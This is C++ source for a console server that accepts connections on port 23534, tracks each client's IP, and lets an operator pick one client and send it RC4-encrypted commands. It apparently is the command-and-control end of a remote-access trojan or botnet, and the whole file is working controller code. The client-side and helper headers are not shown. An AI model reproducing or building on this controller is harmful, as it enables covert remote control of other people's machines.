#include <iostream>
#include <thread>
#include <map>
#include "ssocket.hpp"
#include "cmder.hpp"

#ifndef _KEYWORDS_HPP_
#define _KEYWORDS_HPP_
#include "keywords.hpp"
#endif

using namespace std;

map<int, string> clients;
int currentClient = -1;

void test()
{
    // cout << "Starting Server, Please Wait ..." << endl;
}

void onClientConnect(MySocket::Socket serverSocket)
{
    while (true)
    {
        pair<int, sockaddr_in> clientData = serverSocket.Accept();
        if (clientData.first < 0)
        {
            // cout << "Failed to connect to client ... " << endl;
            continue;
        }

        // Get client info
        socklen_t cAddrLen = sizeof(clientData.second);
        getpeername(clientData.first, (sockaddr *)&clientData.second, &cAddrLen);
        string clientIP = inet_ntoa(clientData.second.sin_addr);
        clients[clientData.first] = clientIP;
        // cout << "Connected to " << clientIP << " . Client_Socket: " << clientData.first << endl;
    }
}

int main()
{
    cout << "Starting Server, Please Wait ..." << endl;
    while (1)
    {
        MySocket::Socket socket(23534);

        socket.Init();
        socket.Listen(test);

        if (socket.isNotConnected())
        {
            socket.Close();
            continue;
        }

        thread handleClient(onClientConnect, socket);
        handleClient.detach();

        string terminalPrompt = "> ";
        string cmdStr;
        while (!socket.isNotConnected())
        {
            cout << terminalPrompt;
            getline(cin, cmdStr);
            vector<string> Cmds = parseCmds(cmdStr);

            string cmdName = Cmds.back();
            Cmds.pop_back();

            if (cmdName == "/quit")
            {
                socket.Close();
                return 0;
            }
            // char *eCmd = CreateCmd(cmd);
            else if (cmdName == "/help")
            {
                displayHelp();
            }
            else if (cmdName == "/list_users")
            {
                listUsers(clients);
            }
            else if (cmdName == "/focus")
            {
                if (Cmds.size() >= 1)
                {
                    string uid = Cmds.back();
                    Cmds.pop_back();

                    stringstream ss;
                    ss << uid;
                    int uidNum;
                    ss >> uidNum;

                    if (clients.find(uidNum) == clients.end())
                    {
                        cout << "No client with id [" << uidNum << "] ... " << endl;
                    }
                    else
                    {
                        currentClient = uidNum;
                        cout << "Successfuly set client to [" << uidNum << "] ..." << endl;
                        terminalPrompt = "[" + uid + "]> ";
                    }
                }
                else
                {
                    displayHelp();
                }
            }
            else if (cmdName == "/current_user")
            {
                if (clients.find(currentClient) == clients.end())
                {
                    cout << "No client with id [" << currentClient << "] ... " << endl;
                }
                else
                {
                    cout << "Currently focus on client ["
                         << currentClient
                         << "] ... \n"
                         << "Address: "
                         << clients.at(currentClient)
                         << endl;
                }
            }
            else if (cmdName == "/send")
            {
                string toSend("");
                int cmdSize = Cmds.size();
                for (int i = 0; i < cmdSize; i++)
                {
                    // cout << Cmds.back() << endl;
                    toSend += Cmds.back() + "_";
                    Cmds.pop_back();
                }

                cout << "Sending: " << toSend << endl;

                RC4 r(INET_KEY);
                toSend = r.encrypt(toSend);

                int res = send(currentClient, toSend.c_str(), toSend.size(), 0);
            }
            else
            {
                displayHelp();
            }
        }
        socket.Close();
    }

    return 0;
}